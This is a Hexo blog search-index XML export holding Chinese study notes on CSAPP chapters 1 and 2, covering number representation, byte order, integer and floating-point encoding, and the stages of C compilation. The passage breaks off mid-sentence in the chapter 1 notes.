<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP 第二章 信息存储 总结</title>
    <link href="/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h3 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h3><h5 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h5><p>二进制的英文简写为 bin ，用数字 1 和0 表示。</p><p>现代计算机存储和处理信息都用<strong>二进制</strong>表示，其原因是二值信号能够很容易地被表示、存储和传输。</p><p>对于人类，十进制刚好对应十个手指，所以我们采用十进制表示；而对于计算机，就像某一指示灯是否亮起、导线是否连通这样的表示，就只有 “是” 或 “否” 两种可能，正对应二进制0和1，所以在机算机中二进制值工作得更好。</p><h5 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h5><p>十六进制的英文简写为 hex ，使用数字 0 ~ 9 和字母 A ~ F 来表示。</p><p>在 C 语言中，我们通常用 <code>0x</code> 来作为辨别十六进制数字的标志。C语言中的十六进制数字<strong>大小写等效</strong>，比如二进制数字 FA1D37B 我们可以表示为 0xfa1d37b 也可以表示为 0XFA1D37B 甚至大小写混合 0xFa1D37b。</p><h5 id="不同进制之间的转换"><a href="#不同进制之间的转换" class="headerlink" title="不同进制之间的转换"></a>不同进制之间的转换</h5><p>我们二进制、十六进制与十进制转换方法就是权值相加或者是除基值取余，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">10 = ( 2^0 *0 + 2^1 *1 + 2^2 *0 + 2^3 *1 ) -&gt; 1010 <br>100 = 16^1 *6 + 16^0 *4 -&gt; 0x64<br></code></pre></td></tr></table></figure><p>对于二进制和十六进制之间的转换，我们只需要将每一位十六进制数视作四位的二进制数，将每一位分别转换再组合出结果，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">0x3c81e -&gt; 3 + c + 8 + 1 + e -&gt; 0011 1100 1000 0001 1110<br></code></pre></td></tr></table></figure><h3 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h3><h4 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h4><p>字节是计算机可寻址的最小单位，一个字节由 8 位二进制位组成。</p><blockquote><p>计算机只会去访问字节 8 位整体，而不会去访问内存中某个单独的位。</p></blockquote><p>但是因为二进制的表示过于冗长，我们在实际的表示中并不是使用二进制来描述位模式，所以我们会使用十六进制来表示位模式。八位的二进制就对应两位16进制的数。</p><h4 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h4><p>每台计算机都有一个字长，表明指针数据的标称大小，同时字长也是计算机 <code>CPU</code> 一次能处理的最大数据。</p><p>由字长决定的的系统参数是虚拟地址空间的最大大小。也就是说对于一个字长为 x 位的机器来说，虚拟地址的范围就是 0 ~ 2^x-1。由此，我们就知道为什么 32 位的计算机的内存为 4GB 也就是 2^32 字节了。</p><p>大多数 64 位的机器都可以运行 32 位机器编译的程序，我们常说的 32 位程序和 64 位程序的区别在于编译的方式而不是运行的机器类型。</p><p>计算机的不同数据所占字节的大小也不同，具体如下表：</p><table><thead><tr><th>C声明</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>int32_t</td><td>4</td><td>4</td></tr><tr><td>int64_t</td><td>8</td><td>8</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><blockquote><p>C语言中可以用 sizeof( ) 来返回某种类型数据的字节数</p></blockquote><p>由上表可知，只有指针类型的数据会随着机器字长发生变化。就是前面说的，机器字长决定了指针大小。</p><h4 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h4><p>跨越多字节的程序对象，我们需要确认两个规则：<strong>对象地址和字节的排列方法</strong>。</p><p>对于地址，在几乎所有的机器上，所字节对象都被存储为连续的字节序列，对象的地址就是<strong>所使用的字节中最小的地址</strong>。例如，一个四字节的 int 整数被储存在 0x100、0x101、0x102、x103 的位置，那么它的地址就是 0x100。</p><p>字节的排列表示方法有两个规则，分别为<strong>大端序</strong>和<strong>小端序</strong>。</p><p>以数据 0x12345678 为例，他的最高有效位是 12 ，最低有效位是 78。大端序的排列方式是最高有效位排列在最前面，小端序的排列方式是最低有效位排列在最前面。具体的对应关系如下：</p><p>![]( &#x2F;img&#x2F; CSAPP-第二章-信息存储-总结&#x2F;2-大端序和小端序.png)</p><p>由上图来看，大端序更符合人类平时的阅读习惯，但需要注意的是，大多数的 Intel 兼容机器使用的都是小端模式。我们在编写汇编语言时，也需要按照小端序的方式书写。</p><p>我们可以通过下面的函数来输出不同程序对象的字节表示，其中 <em>start</em> 为该对象的起始地址，<em>len</em> 为显示的字节数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行一下下面的例子来观察整形和浮点型数据的关系：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0x00003039</span>;   <span class="hljs-comment">//十进制12345转换为十六进制3039</span><br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    <span class="hljs-type">float</span> y=x;<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">39 30 00 00 <br>00 e4 40 46<br></code></pre></td></tr></table></figure><p>可以看到虽然两种类型的数据都是对 12345 编码，但他们有不同的字节模式。浮点数的输出在整数形态下为 <code>0x4640E400</code>，与整数的存储有着截然不同的结果。</p><p>但是我们对这个结果的二进制适当移位，就会发现它们有13个相匹配的位。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">9</span><br><span class="hljs-attribute">000000000</span> <span class="hljs-number">0000000001000000111001</span><br>            <span class="hljs-attribute">4</span>   <span class="hljs-number">6</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   E    <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br>          <span class="hljs-attribute">0100011001000000111001</span> <span class="hljs-number">0000000000</span><br></code></pre></td></tr></table></figure><p>我们换其他的数据再次尝试就可以发现，匹配的总是 int 型的低位，但匹配位数不固定，float型的匹配部分也不是总是从最高位开始。</p><blockquote><p>原因是浮点数的尾数基本是和原二进制的值一致的，接下来浮点数部分会有相关原理解释</p></blockquote><h4 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h4><p>在C语言中，字符串被编码为以 NULL 结尾的字符数组，字符常用 ASCII 字符码编码表示。</p><p>字符串数组是以大端序储存的，比如我们存储一个字符串 <code>char s[] = &quot;12345&quot;</code>，那么实际上的存储顺序就是 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=&#39;4&#39;,s[4]=&#39;5&#39;,s[5]=&#39;null&#39;</code>。需要注意，就算我们在编写存储字符串时并没有编写末尾的空字节，机器也会自动补充在字符串的末尾也就是最高位上。</p><p>空字节被包含在字符串当中，我们在限制字符串输入长度时需要注意防止溢出。</p><h4 id="表示代码"><a href="#表示代码" class="headerlink" title="表示代码"></a>表示代码</h4><p>不同机器类型使用不同且不兼容的指令和编码方式，二进制码是不兼容的。</p><p>从机器的角度来看，程序就仅仅是字节序列，不会有特定的信息来指示源程序。</p><h4 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h4><p>布尔代数是在二元集合 <code>&#123;0，1&#125;</code> 基础上的定义，在此基础上我们可以进行相关的运算。</p><ul><li><p>与</p><p>1与1为1，1与0为0，0与1为0，0与0为0</p></li><li><p>或</p><p>1或1为1，1或0为1，0或1为1，0或0为0</p></li><li><p>非</p><p>非0为1，非1为0</p></li><li><p>亦或</p><p>1异或1为0，1异或0为1，0异或1为1，0异或0为0</p></li></ul><h4 id="C语言中的运算"><a href="#C语言中的运算" class="headerlink" title="C语言中的运算"></a>C语言中的运算</h4><h5 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h5><p>C语言支持按位的布尔运算，每一位之间独立的进行运算。例如向量 <code>[a,b,…,c]</code> 和 <code>[A,B,…,C]</code> ，我们就可以把每一位元素拿出来单独进行运算，每一位结果为新向量对应位的结果。</p><p>在 C 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h5><p>C 语言中我们用 bool 类型来表示逻辑运算结果，<code>true </code>表示 <code>真(1)</code>，<code>false </code> 表示 <code>假(0)</code> 。逻辑运算有单独的运算符：</p><ul><li><code>&amp;&amp;</code>（逻辑与）：如果两个操作数都为真，则结果为真；否则，结果为假。</li><li><code>||</code>（逻辑或）：如果至少有一个操作数为真，则结果为真；如果两个操作数都为假，则结果为假。</li><li><code>!</code>（逻辑非）：用于取反操作数的值，如果操作数为真，则取反后为假，如果操作数为假，则取反后为真。</li></ul><blockquote><p>bool 数据在进行运算时，会把所有参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code>。</p></blockquote><h5 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h5><p>移位运算分为左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 表示。</p><p>假设整数 <em>X</em> 一共 w 位，<code>X&gt;&gt;k</code> 右移 k 位表示丢弃低 k 位，原来的高 <code>w-k</code> 位变为低 <code>w-k</code> 位，高 <code>k</code> 位变为0。<code>X&lt;&lt;k</code> 左移 k 位表示丢弃高 k 位，原来的低 <code>w-k</code> 位变为高 <code>w-k</code> 位，低 <code>k</code> 位变为0。</p><p>其中右移运算又分为<strong>算术右移</strong>和<strong>逻辑右移</strong>。二者之间的差异就是高位填充值的不同，算术右移复制最高位，逻辑右移填充0。</p><p>由于算术右移的高位填充的是原本的最高位值而不是0，所以<strong>算术右移用于处理带符号整数，逻辑右移用于处理无符号整数</strong>。</p><h3 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h3><h4 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h4><p>C语言有多种不同的整数数据类型，用来表示不同范围的整数。每一种类型都可以用关键字来指定大小以及数字的正负。根据字节分配，不同的大小所能表示的值的范围不同，具体如下表：</p><blockquote><p>64位和32位只用long指示符的取值范围不同，括号内为32位对应的取值范围</p></blockquote><table><thead><tr><th>C数据类型</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808 (-2147483648)</td><td>9223372036854775807 (2147483647)</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615 (4294967295)</td></tr></tbody></table><p>如上表我们可以发现，有符号的数据类型在正数和负数的范围并不严格对称，负数范围总是比正数大1。</p><p>需要注意的是，通常C语言中<strong>大多数的数字都默认为有符号</strong>，要创建无符号常量必须加上后缀字符 <code>&#39;u&#39;</code> 或 <code>&#39;U&#39;</code>。例如声明 <code>12345</code> 这样的常量就被认为是有符号的， <code>0x12b4u</code> 才会被认为是无符号常量。</p><h5 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h5><p>无符号数实际上就是非负数，就是只包括正数和 0 的部分。无符号数没有符号位，因此他们的编码范围始终从 0 开始。</p><p>无符号整数的编码方法通常基于二进制表示，每位（或位组合）可以表示 2 个可能的值：0和1。编码中没有符号位，<strong>最高位通常是最高有效位</strong>，表示最大的权值。</p><p>![]( &#x2F;img&#x2F; CSAPP-第二章-信息存储-总结&#x2F;2-无符号编码.png)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>位二进制编码：<span class="hljs-number">0000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">1001</span> (<span class="hljs-number">9</span>), <span class="hljs-number">1111</span> (<span class="hljs-number">5</span>)<br><span class="hljs-attribute">8</span>位二进制编码：<span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">01011010</span> (<span class="hljs-number">90</span>), <span class="hljs-number">11111111</span> (<span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><blockquote><p>就是最简单的正常二进制表示方法 </p></blockquote><h5 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h5><p>实际运用中不仅只有正数数据，我们还想要实现负数值，补码就是最常见的负数表示方法。</p><p>在补码的定义中，<strong>字的最高位为符号位</strong>。符号位为0表示正数，符号位为1表示负数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>位二进制补码： <span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">00000101</span> (<span class="hljs-number">5</span>), <span class="hljs-number">11111011</span> (-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>在单纯的二进制数字层面，由于最高位是最高权值，所以在位数相同的情况下，最高位是 1 的二进制数永远大于最高位是 0 的二进制数。因此正负数补码对应的二进制范围是没有交集的，所以无论其他位如何变化都不会使某个数据的正负混淆。</p><h4 id="有符号数与无符号数的转换"><a href="#有符号数与无符号数的转换" class="headerlink" title="有符号数与无符号数的转换"></a>有符号数与无符号数的转换</h4><p>有符号数和无符号数之间的转换分为两种：显示转换和隐式转换。</p><p><strong>显示转换</strong>也称强制类型转换，需要使用特定的语法和类型转换操作符。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = (<span class="hljs-type">int</span>) unsignedValue ; <br>unsignedValue = (<span class="hljs-type">unsigned</span>) signedValue;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，显示转换可能导致数据截断或数据丢失。</p></blockquote><p><strong>隐式转换</strong>也称为自动类型转换或自动升级，由编译器自动执行，以使表达式或操作能够成功进行。</p><p>例如，将一种类型的表达式赋值给另外一种类型的变量，编译器会自动执行隐式转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = unsignedValue ; <br>unsignedValue = signedValue;<br></code></pre></td></tr></table></figure><p>不同类型的变量进行运算时发生的也是隐式转换。</p><p>隐式转换原则：</p><ul><li><p>在混合使用浮点数和整数类型时，通常将整数提升为浮点数，出现过double则结果一定为double</p></li><li><p>若都是整数参与运算则结果也是整数</p></li><li><p>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</p></li></ul><h4 id="扩展一个数字的位表示"><a href="#扩展一个数字的位表示" class="headerlink" title="扩展一个数字的位表示"></a>扩展一个数字的位表示</h4><p>要将无符号数转化成一个更大的数据类型，我们只需要在开头添加 <code>0</code> 即可。这种运算称为 <strong>0 扩展</strong>。</p><p>但是如果是将补码数字转换为更大的数据类型，将会执行<strong>符号扩展</strong>，非负数开头添加 <code>0</code> ，负数则需要开头添 <code>1</code>。</p><p>我们运行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">short</span> x=<span class="hljs-number">0x1234</span>;<br>    <span class="hljs-type">short</span> y=<span class="hljs-number">-0x1234</span>;<br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>    <span class="hljs-type">int</span> x1=x;<br>    <span class="hljs-type">int</span> y1=y;<br>    show_bytes(&amp;x1,<span class="hljs-keyword">sizeof</span>(x1));<br>    show_bytes(&amp;y1,<span class="hljs-keyword">sizeof</span>(y1));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">34 12 <br>cc ed<br>34 12 00 00<br>cc ed ff ff<br></code></pre></td></tr></table></figure><h4 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h4><p>我们需要减少一个数字的位数时就需要截断数字，当我们将 w 位的数字截断为 k 位数字时，我们就会丢弃有效位的高 <code>w-k</code> 位，补码数字的符号位是始终不变的。</p><p>需要注意有符号数的阶段可能会发生溢出现象。例如，一个8位带符号整数，其范围是从 -128 到 127。如果原始带符号整数为 -150，将其截断为 8 位带符号整数会导致溢出，因为 -150 不在 -128 到 127 的范围内。截断后的结果可能是正数 106，这是 -150 的溢出结果，这不是原始值的正确表示。</p><h3 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h3><h5 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h5><p>无符号加法遵循二进制的加法规则，从最低位（最右边的位）开始逐位相加，进位会传递到高位。</p><p>补码加法仍然遵循标准的二进制加法规则，但符号位也会参与计算。当执行补码加法时，符号位与其他位一起相加，如果有溢出，则溢出会影响符号位。</p><h5 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h5><p>无符号乘法遵循标准的乘法规则，乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code>和 <code>y</code> 的位数。需要注意，因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此可能会发生截断。</p><p>补码乘法同样遵循标准的乘法规则，但符号位也会参与计算。可以理解为先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h5 id="除以2的幂"><a href="#除以2的幂" class="headerlink" title="除以2的幂"></a>除以2的幂</h5><p>除以 2 的幂通过右移运算来实现，无符号和补码数分别使用逻辑移位和算术移位来实现。</p><h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><h4 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h4><p>二进制小数的表示方法和十进制原理相同，只不过十进制的底数为 10，二进制的权值底数变成了 2。</p><h4 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h4><p>IEEE浮点标准用如下的公式来表示一个数：</p><p>![]( &#x2F;img&#x2F; CSAPP-第二章-信息存储-总结&#x2F;2-IEEE浮点数表示方法.png)</p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><blockquote><p>这个方法就相当于是二进制的科学计数法。</p></blockquote><p>浮点数可以分为三个字段：符号位，阶码字段和小数字段。</p><p>我们经常用的浮点数有两类，单精度浮点数 <code>float</code> 和双精度浮点数 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位；第 <code>2</code> 到第 <code>9</code> 位表示阶码，用来指示指数位；第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位；第 <code>2</code> 到第 <code>12</code> 位表示阶码，用来指示指数位；第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>根据阶码部分的值，被编码的值有 <code>3 </code>中表示的情况：</p><ul><li><p>规格化的值：阶码位不为全 <code>0</code> 也不为全 <code>1</code>。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=e-(2^k-1)</code></p></li><li><p>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=1-(2^k-1)</code></p><p>非格式化数可以用来表示非常接近于 0.0 的数，它提供了一种逐渐溢出的属性使可能的数值均匀的接近于 0.0。</p></li><li><p>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</p></li></ul><h5 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h5><p>因为浮点数的表示方法限制了浮点数的范围和精度，多以我们需要利用特定的系统的方法使存储的数据无限接近于实际的数字，这就是舍入的工作。</p><p>总共有四种舍入的方法，下表为原理示例：</p><table><thead><tr><th align="center">方式</th><th align="center">1.40</th><th align="center">1.60</th><th align="center">1.50</th><th align="center">2.50</th><th align="center">-1.50</th></tr></thead><tbody><tr><td align="center">向偶数舍入</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向零舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-1</td></tr><tr><td align="center">向下舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向上舍入</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">3</td><td align="center">-1</td></tr></tbody></table><blockquote><p>其中，向偶数舍入也就是向最近的值舍入，其他的方法原理均和字面含义相同</p></blockquote><h5 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h5><p>浮点数的加法和减法遵循一般的二进制加法和减法规则，但需要额外考虑指数部分的对齐。</p><p>浮点数的乘法和除法也遵循一般的二进制乘法和除法规则，但需要额外的处理来正确处理指数和尾数。具体来说，乘法时将指数相加，尾数相乘，然后对结果进行规范化。除法时将指数相减，尾数相除，然后对结果进行规范化。</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第一章 计算机系统漫游 总结</title>
    <link href="/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>第一章是总论，把一下简单的概念梳理了一下</p><span id="more"></span><h1 id="程序的编译"><a href="#程序的编译" class="headerlink" title="程序的编译"></a>程序的编译</h1><p>带有 <code>.c</code> 后缀的C语言源文件是不能直接在程序上运行的，需要将其中的C语句转换为机器语言，按照<strong>可执行目标程序</strong>的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为<strong>可执行目标文件。</strong></p><p>我们常使用的编译命令 <code>gcc -o hello hello.c</code> ，具体的编译过程分为四个阶段：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><h3 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h3><p>预处理器将根据将读取所有的 <code>#include</code> 头文件以及宏定义，把他们插入文本中，将原本的命令替换成其具体详细的内容。</p><p>处理结果是得到 <code>.i</code> 文本文件</p><h3 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h3><p>编译器将 <code>.i</code> 文件转换为 <code>.s</code> 文件，其代码指令由C语言代码转为汇编指令。文件中包含函数 main 的定义，类似下图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>pushq %rbp<br>movq %rsp ,%rbp<br>leaq .LC0 ,%rdi<br>call puts@PLT<br>movl $0 ,%eax<br>popq %rbp<br>ret<br></code></pre></td></tr></table></figure><h3 id="03-汇编"><a href="#03-汇编" class="headerlink" title="03 汇编"></a>03 汇编</h3><p>汇编器将 <code>.s</code> 文件的人类可读的文本指令转换为计算机可读的二进制机器语言指令，把这些指令打包成一种叫做<strong>可重定位目标程序</strong>（relocatable object program）的格式，并将结果保存在 <code>.o</code> 